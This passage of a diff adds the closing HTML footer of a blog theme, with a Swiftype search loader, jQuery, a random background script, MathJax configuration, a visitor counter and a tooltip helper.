+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+  
+  _st('install','AjANbx_Gvxi4Gqwsd6Kq','2.0.0');
+</script>
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 31;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
